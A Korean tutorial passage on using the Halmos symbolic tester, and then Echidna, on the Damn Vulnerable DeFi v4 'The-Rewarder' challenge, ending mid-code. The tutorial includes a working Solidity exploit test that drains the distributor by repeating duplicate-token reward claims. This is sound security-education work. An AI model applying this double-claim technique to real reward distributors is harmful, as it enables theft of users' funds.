# Halmos vs The-rewarder

## Halmos 버전
이 글에서는 halmos 0.2.2.dev1+gd4cac2e 버전이 사용되었습니다.

## 서문
독자는 다음의 이전 글들에 익숙하다고 강력하게 가정합니다:
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)

주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다.

또한, 이름은 같지만 v4의 **The-rewarder** 챌린지는 v3와 비교하여 조건과 버그 메커니즘이 완전히 다르다는 점을 분명히 해야 합니다. 따라서 새로운 **The-rewarder**와 이 문제에 대한 일반적인 솔루션에 익숙해지는 것이 좋습니다. 우리는 Halmos 사용에 집중할 것이며, 챌린지 설명에는 집중하지 않을 것입니다.

## 준비
### 공통 필수 조건
1. **TheRewarder.t.sol** 파일을 **TheRewarderHalmos.t.sol**로 복사합니다.
2. `test_theRewarder()`의 이름을 `check_theRewarder()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오. 과제의 특성상 하드코딩된 주소는 비정상적으로 보일 수 있습니다. 이번에는 **weth-distribution.json**에서 `player`와 `Alice` 주소를 직접 가져올 것입니다. 왜냐하면 과제의 로직 자체가 이 주소들과 연결되어 있기 때문입니다:
    ```solidity
    address deployer = address(0xcafe0000);
    address recovery = address(0xcafe0002);
    address alice = address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6);
    address player = address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C);
    ```
4. **GlobalStorage** 계약을 생성하고 계약의 주소-이름 쌍을 저장하십시오:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(dvt), "DamnValuableToken");
        glob.add_addr_name_pair(address(weth), "WETH");
        glob.add_addr_name_pair(address(distributor), "TheRewarderDistributor");
    }
    ```
    `merkle` 계약은 완전히 읽기 전용이므로 무시합니다.
5. 이슈 #338 우회
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. 모든 계약 주소를 출력하십시오:
    ```solidity
    console.log("GlobalStorage", address(glob));
    console.log("DamnValuableToken", address(dvt));
    console.log("WETH", address(weth));
    console.log("TheRewarderDistributor", address(distributor));
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_theRewarder
    ...
    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] DamnValuableToken 0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] WETH 0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] TheRewarderDistributor 0x00000000000000000000000000000000000000000000000000000000aaaa0006
    ```
7. `vm.expectRevert()`는 지원되지 않는 치트코드입니다. 그냥 삭제하십시오.
### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
// Player saved as much funds as possible, perhaps leaving some dust
assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

// All funds sent to the designated recovery account
assertEq(
    dvt.balanceOf(recovery),
    TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
    "Not enough DVT in recovery account"
);
assertEq(
    weth.balanceOf(recovery),
    TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
    "Not enough WETH in recovery account"
);
```
평소와 같이, `distributor`에서 예상치 못한 금액을 비울 수 있는지 확인합니다. 여기의 공식은 우리가 보던 것보다 조금 더 복잡할 것입니다. 먼저, `Alice`가 보상을 받았고 `player` 자신도 한 번 보상을 받을 것으로 예상된다는 점을 고려합니다. 따라서 불변 조건은 다음과 같습니다:
```solidity
function _isSolved() private view {
    assert (dvt.balanceOf(address(distributor)) >= 
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - 11524763827831882);
    assert (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - 1171088749244340);
}
```
`11524763827831882`와 `1171088749244340`은 플레이어가 보상 수령자 중 한 명으로서 받을 것으로 예상되는 **DVT** 및 **WETH** 금액입니다. 이 숫자들은 **dvt-distribution.json**과 **weth-distribution.json**에서 가져왔습니다.
### 보상 로드
설정(setup) 과정에서, 원래 테스트는 내부적으로 1000개의 레코드를 **JSON** 형식으로 파싱하여 `distributor` 계약에 업로드합니다. 그러나 문제가 있습니다: Halmos는 `vm.projectRoot()`, `vm.readFile()`, `vm.parseJson()`과 같은 필수 치트 코드를 지원하지 않습니다. 우리는 다소 지저분하지만 효과적인 방법으로 이 문제를 우회할 것입니다. **JSON**을 파싱하는 대신, 필요한 바이트를 바로 올바른 위치에 명시적으로 삽입할 것입니다.

먼저, 원래 **TheRewarder.t.sol**에서 필요한 바이트를 기록해 봅시다:
```solidity
function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
    console.logBytes(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))));
    ...
```
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
  0x000...e962
  0x000...b3d4
```
Halmos 테스트에 삽입합니다:
```solidity
function setUp() public {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
    
    
function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
이 작업은 Halmos에서 시간이 오래 걸립니다: 제 기기에서 `dvt`와 `weth` 잎(leaves)을 생성하는 데 1분이 꼬박 걸렸습니다.
### 머클(Merkle) 함수 다루기
진행하기 전에, [머클 트리](https://www.investopedia.com/terms/m/merkle-tree.asp)가 어떻게 작동하고 트리에서 잎의 존재를 어떻게 확인하는지 이해하는 것이 강력히 권장됩니다.

암호학이 다시 한번 우리의 작업을 방해합니다. 테스트를 실행하려고 하면 오류가 발생합니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
Error: setUp() failed: HalmosException: No successful path found in setUp()
```
문제는 `merkle.getRoot()`에 있습니다:
```solidity
function getRoot(bytes32[] memory data) public pure virtual returns (bytes32) {
    require(data.length > 1, "won't generate root for single leaf");
    while (data.length > 1) {
        data = hashLevel(data);
    }
    return data[0];
}
```
Halmos는 큰 루프를 잘 처리하지 못합니다. 물론 `--loop` 옵션을 충분히 크게 설정하여 Halmos를 실행할 수도 있습니다. 하지만 여기서 또 다른 문제에 부딪힙니다. 로깅을 추가하여 이를 가장 쉽게 보여줄 수 있습니다:
```solidity
console.log("start get root 1");
dvtRoot = merkle.getRoot(dvtLeaves);
console.log("end get root 1");
console.log("start get root 2");
wethRoot = merkle.getRoot(wethLeaves);
console.log("end get root 2");
...
 // Create DVT distribution
dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
distributor.createDistribution({
    token: IERC20(address(dvt)),
    newRoot: dvtRoot,
    amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
});
console.log("approve 1");

// Create WETH distribution
weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
distributor.createDistribution({
    token: IERC20(address(weth)),
    newRoot: wethRoot,
    amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
});
console.log("approve 2");
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 --solver-timeout-branching 0
...
[console.log] start get root 1
[console.log] end get root 1
[console.log] start get root 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
...  
```
이유는 모르겠지만, Halmos는 `merkle.getRoot(wethLeaves)`에서 전혀 필요하거나 예상되지 않는 불필요한 분기를 수행합니다. 사실 Halmos는 수식의 복잡성 때문에 여기서 특정 루트가 아니라 심볼릭 횡설수설을 반환합니다:
```solidity
console.log("start get root");
dvtRoot = merkle.getRoot(dvtLeaves);
console.logBytes32(dvtRoot);
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 --solver-timeout-branching 0
...
[console.log] start get root
[console.log] f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat...de962)))))))))))))))))))))
...
```
좋은 소식은 런타임에 `root`를 찾을 필요가 없다는 것입니다. 원래 forge 테스트에서 한 번 계산하고 하드코딩하는 것으로 충분합니다:
```solidity
merkle = new Merkle();
console.logBytes32(merkle.getRoot(dvtLeaves));
console.logBytes32(merkle.getRoot(wethLeaves));
...
```
그리고 우리가 얻은 것은 다음과 같습니다:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
    0x399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4
    0x5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6
    ...
```
따라서, Halmos 테스트는 다음과 같습니다:
```solidity
merkle = new Merkle();
dvtRoot = hex"399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4";
wethRoot = hex"5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6";
//dvtRoot = merkle.getRoot(dvtLeaves);
//wethRoot = merkle.getRoot(wethLeaves);
```
Alice의 `merkle.getProof()`로 비슷한 트릭을 해봅시다. Halmos 테스트는 다음과 같이 변경됩니다:
```solidity
// Create Alice's claims
Claim[] memory claims = new Claim[](2);
bytes32[] memory dvtproof = new bytes32[](3);
dvtproof[0] = hex"925450a3cfe3826ad85358e2b3df638edc7c8553b6faee9e40fd9c6e9e3a3e04";
dvtproof[1] = hex"f262e0db29c13826883ed5262d51ad286f1bd627b4632141534c6cb80f01f430";
dvtproof[2] = hex"5ad8d27e776667615f79b7c7be79980ac8352518ca274a8ed68a9953ee4302d5";

bytes32[] memory wethproof = new bytes32[](3);
wethproof[0] = hex"7217ae40b137a0d9d7179ef8bb0d0a0a8002dc6fefed8e9faa17b29bc037b747";
wethproof[1] = hex"fdad7418265f24fd2100fbcde33a22785f151aa01ab26aefd76c58bbfa0a9592";
wethproof[2] = hex"0be25e66daab92e7052e6c307ae4743bba49ae08c7324acbc3eb730f51b991e0";

// First, the DVT claim
claims[0] = Claim({
    batchNumber: 0, // claim corresponds to first DVT batch
    amount: ALICE_DVT_CLAIM_AMOUNT,
    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
    proof: dvtproof // Alice's address is at index 2
});
console.log("claims[0] created");

// And then, the WETH claim
claims[1] = Claim({
    batchNumber: 0, // claim corresponds to first WETH batch
    amount: ALICE_WETH_CLAIM_AMOUNT,
    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
    proof: wethproof // Alice's address is at index 2
});
```
다음으로 `TheRewarderDistributor::claimRewards()`의 `MerkleProof.verify()`를 살펴보겠습니다:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    bytes32 root = distributions[token].roots[inputClaim.batchNumber];
    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
    ...
}
```
**MerkleProof** 계약:
```solidity
function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
    return processProof(proof, leaf) == root;
}
...
function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
    bytes32 computedHash = leaf;
    for (uint256 i = 0; i < proof.length; i++) {
        computedHash = _hashPair(computedHash, proof[i]);
    }
    return computedHash;
}
```
분명히, 심볼릭 분석 방법을 사용하여 그러한 `inputClaim.proof`를 찾을 수 없습니다. 이는 말 그대로 해시 암호화를 깨는 것을 의미하기 때문입니다.
따라서 Halmos는 유효한 `proof`를 찾지 못하여 제대로 작동하지 않을 것입니다.

하지만 방법이 있습니다. 우리는 이미 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations)에서 암호학적 검사를 접했습니다.
거기서 우리는 암호학적 검증을 완전히 제거했지만, 입력된 데이터가 정확하다는 것을 명확히 표시했습니다. 여기서도 비슷한 작업을 수행할 것입니다: 암호학적 검증을 제거하지만, `msg.sender`에 대해 올바른 `amount`를 전송했다고 가정합니다(이것이 이 암호학적 검증의 목적입니다):
```solidity
...
if (msg.sender == address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // player address
{
    if (address(token) == address(0xaaaa0003)) // If DVT token
        vm.assume(inputClaim.amount == 11524763827831882);
    else if (address(token) == address(0xaaaa0004)) // If WETH token
        vm.assume(inputClaim.amount == 1171088749244340);
}
//bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
//bytes32 root = distributions[token].roots[inputClaim.batchNumber];

//if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
...
```
또한 여기서 **MerkleProof** 구현에 버그가 없고 예상대로 작동한다고 가정하고 있다는 점을 언급할 가치가 있습니다.
### 중첩된 vm.startPrank() 피하기
Halmos의 현재 버전은 중첩된 `startPrank()`를 지원하지 않습니다. 따라서
```solidity
startHoax(deployer, 1 << 80);
...
vm.startPrank(alice);
...
vm.stopPrank(); // stop alice prank
vm.stopPrank(); // stop deployer prank
```
이것을 다음과 같이 교체합니다:
```solidity
startHoax(deployer, 1 << 80);
...
vm.stopPrank(); // stop deployer prank
vm.startPrank(alice);
...
vm.stopPrank(); // stop alice prank
```
와, 정말 긴 준비 과정이었네요. 다음 단계로 넘어갑시다!
## SymbolicAttacker 없음?
이 챌린지에는 편리한 **SymbolicAttacker** 프록시 계약을 사용하지 못하게 하는 특징이 있습니다. **TheRewarderDistributor** 계약의 로직은 `player` 특정 주소에 연결되어 있으므로, **TheRewarderDistributor**의 `msg.sender`는 정확히 플레이어의 주소여야 합니다. 대신, 모든 **SymbolicAttacker** 로직을 **TheRewarderChallenge** 테스트 계약으로 바로 옮길 것입니다.
## 커버리지 개선
계획에 따라 단일 심볼릭 트랜잭션을 실행하여 모든 경로가 커버되는지 확인합니다:
```solidity
function attack() private {
    execute_tx();
    //execute_tx();
}
function check_theRewarder() public checkSolvedByPlayer {
    ...
    attack();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
[ERROR] check_theRewarder() (paths: 180, time: 30.22s, bounds: [])
WARNING:halmos:Encountered symbolic memory offset: 704 + Concat(Extract(250, 0, p_inputClaims[0].tokenIndex_uint256_5cfd392_07), 0)
...
WARNING:halmos:check_theRewarder(): paths have not been fully explored due to the loop unrolling bound: 2
...
```
### 심볼릭 루프 늘리기
우리는 **GlobalStorage**에 3개의 계약을 저장했지만, Halmos는 기본적으로 2번의 루프 반복을 실행합니다. Halmos 명령에 `--loop 3` 매개변수를 추가해 봅시다.
### 심볼릭 토큰 인덱스
오래된 심볼릭 오프셋 문제이지만 새로운 형태입니다. 이번에는 인덱스로 IERC20 토큰을 검색하려고 하는데, 이 인덱스가 심볼릭 값이며 Halmos는 이를 좋아하지 않습니다:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    if (token != inputTokens[inputClaim.tokenIndex]) {
...
```
`inputTokens` 배열의 크기에 제한이 없으므로, 말 그대로 모든 주소를 심볼릭 인덱스로 찾을 수 있습니다. 따라서 우리는 모든 곳에서 `inputTokens[inputClaim.tokenIndex]` 대신 **심볼릭 토큰**을 사용하여 이 심볼릭 오프셋 문제를 해결할 것입니다:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    address symbolicInputToken = svm.createAddress("SymbolicInputToken");
    if (msg.sender != address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // If Alice 
    {
        symbolicInputToken = address(inputTokens[inputClaim.tokenIndex]);
    }
    //if (token != inputTokens[inputClaim.tokenIndex]) {
    if (token != IERC20(symbolicInputToken)) {
        ...
        //token = inputTokens[inputClaim.tokenIndex];
        token = IERC20(symbolicInputToken);
        ...
    }
    ...
    //inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    IERC20(token).transfer(msg.sender, inputClaim.amount);
}
```
여기서 Halmos가 이 경우(만약 `player`가 이 함수를 심볼릭하게 호출한다면 - `inputClaims`와 `inputTokens` 배열의 크기는 심볼릭일 것입니다)와 같이 심볼릭 크기의 배열을 어떻게 처리하는지 명시적으로 이야기할 가치가 있습니다. 이것은 `--default-array-lengths` 매개변수로 규제되며, 기본값은 "0,1,2"입니다. 이는 Halmos가 배열 크기가 0일 때, 1일 때, 2일 때의 3가지 경우를 별도로 처리함을 의미합니다.

실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 3
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0003
halmos_SymbolicInputToken_address_b649884_30 = 0x00000000000000000000000000000000aaaa0003
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
```
운이 좋았습니다: 하나의 심볼릭 트랜잭션으로 버그를 찾기에 충분했습니다. 반례를 처리해 봅시다.
## 반례 분석
제공된 2개의 반례는 본질적으로 **DVT**와 **WETH** 토큰에 대해 각각 작동하는 하나의 버그입니다. 간단히 말해서, `inputClaims[]` 배열의 서로 다른 `tokenIndex` 요소에 동일한 토큰 인덱스를 전달하면 보상을 여러 번 수령할 수 있습니다:
```javascript
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
```
우리가 `inputTokens[inputClaim.tokenIndex]` 로직을 `SymbolicInputToken`으로 대체했으므로, 반례에서 버그의 로직이 그렇게 명확하지 않다는 것을 기억하십시오. 그럼에도 불구하고 - 버그가 발견되었습니다.
## 반례 사용
Halmos 테스트에서 우리는 암호학적 검사를 무시했습니다. 하지만 여기서는 그것들을 사용할 것입니다. 또한 모든 자금을 `recovery`로 이체해야 한다는 것을 기억합니다. 따라서 `distributor`를 가능한 최대 금액만큼 비우도록 공격을 구성해 봅시다:
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    bytes32[] memory dvtLeaves = _loadRewards(
        "/test/the-rewarder/dvt-distribution.json"
    );
    bytes32[] memory wethLeaves = _loadRewards(
        "/test/the-rewarder/weth-distribution.json"
    );
    uint256 dvtPlayerReward = 11524763827831882;
    uint256 wethPlayerReward = 1171088749244340;
    uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
    uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;

    Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));
    for (uint256 i = 0; i < dvtAttackCount; i++) {
        claims[i] = Claim({
        batchNumber: 0, // claim corresponds to first DVT batch
        amount: dvtPlayerReward,
        tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
        });
    }
    for (uint256 i = 0; i < wethAttackCount; i++) {
        claims[dvtAttackCount + i] = Claim({
        batchNumber: 0, // claim corresponds to first WETH batch
        amount: wethPlayerReward,
        tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
        proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
        });
    }

    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
실행:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol
...
[PASS] test_theRewarder() (gas: 1005136185)
...
```
Halmos가 찾은 버그를 사용하여 또 다른 챌린지를 해결했습니다!
## 퍼징 타임
이 글을 쓰는 시점에서, 저는 **The-Rewarder**의 업데이트된 버전에 대한 퍼징 솔루션을 찾지 못했습니다. 직접 구현해 봅시다. 퍼징 엔진으로 **Echidna**를 사용할 것입니다.
### 공통 준비
Echidna 설정 파일:
```javascript
deployer: '0xcafe0001' 
sender: ['0x44E97aF4418b7a17AABD8090bEA0A471a366305C']
allContracts: true
workers: 8
balanceContract: 100000000000000000000000000000000000000000000000000000000000000000000000
```
Echidna도 **JSON**에서 데이터를 로드하는 데 동일한 문제가 있으므로 하드코딩된 데이터를 사용하여 동일한 트릭을 수행해 봅시다:
```solidity
constructor() public payable {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}

function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
또한, 단순함을 위해 `Alice`와 관련된 로직은 완전히 무시합니다. 그녀가 토큰을 가져갔다는 사실은 버그의 존재 여부에 아무런 영향을 미치지 않기 때문입니다. 우리는 Echidna가 버그를 찾을 수 있는지 여부에만 관심이 있습니다.

자, 불변 조건:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT - 11524763827831882) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - 1171088749244340) 
        {
            return true;
        }
    }
    return false;
}
```
Echidna를 위해 `TheRewarderDistributor::claimRewards()`의 증명 확인 작업도 단순화할 것입니다. 이 확인을 제거하되 올바른 인수를 전달했다고 가정해 봅시다:
```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0x62d69f6867A0A084C6d313943dC22023Bc263691))) // weth
    {
        inputClaim.amount = 1171088749244340;
    }
    else if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84))) // dvt)
    {
        inputClaim.amount = 11524763827831882;
    }
    ...
    //bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    //bytes32 root = distributions[token].roots[inputClaim.batchNumber];

    //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
```
실행:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
아무것도 없습니다.
### Echidna의 한계 분석
이 실패 후, 저는 Echidna가 최소한 "공정한" 보상이라도 가져갈 수 있는 유효한 매개변수를 생성할 수 있는지 확인하기로 결정했습니다.

잠시 불변 조건을 단순화해 봅시다:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT/* - 11524763827831882*/) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT/* - 1171088749244340*/) 
        {
            return true;
        }
    }
    return false;
}
```
다시 실행:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.claimRewards([(3, 4, 2, ["s\208n\ENQ\233\198\246v\157\134Gsw\200)N\SI\137\210\184\138\175\254\207\217\DEL\197sy\235T\236", "z\DLE]\155\142)b\199\146\SI\159o\193\\\228\156\EOTk\237\216j\SOH%\131\193\&5\170\DELqzw\223"])],[0x1fffffffe, 0x1fffffffe, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0xffffffff, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0x2fffffffd, 0x1fffffffe, 0xffffffff, 0x0, 0xb4c79dab8f259c7aee6e5b2aa729821864227e84])
...
```
멋지네요! 적어도 "공정한" 트랜잭션은 찾았습니다. 이제 Echidna가 더 큰 `inputClaims` 배열(크기가 최소 2 이상)로 동일한 간단한 트랜잭션을 생성할 수 있는지 확인해 봅시다:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    require(inputClaims.length >= 2);
    ...
```
시도:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
네, 문제는 Echidna가 크기 2 이상의 `inputClaims` 배열을 생성하는 데 어려움을 겪는다는 것입니다. 저는 그러한 경우에 **push-pop-use** 패턴을 사용할 것을 권장하는 다음 [기사](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays)를 찾았습니다. 또한 이 테스트를 위해 **불변 조건**을 다시 돌려놓았습니다.
```solidity
contract TheRewarderDistributor {
    ...
    Claim[] public storageInputClaims;
    IERC20[] public storageInputTokens;
    ...
    function pushClaim(Claim memory claim) public {
        storageInputClaims.push(claim);
    }
    
    function pushToken(IERC20 token) public {
        storageInputTokens.push(token);
    }

    ...
    function claimRewards(/*Claim[] memory inputClaims, IERC20[] memory inputTokens*/) external {
        ...
         for (uint256 i = 0; i < storageInputClaims.length; i++) {
            inputClaim = storageInputClaims[i];
            ...
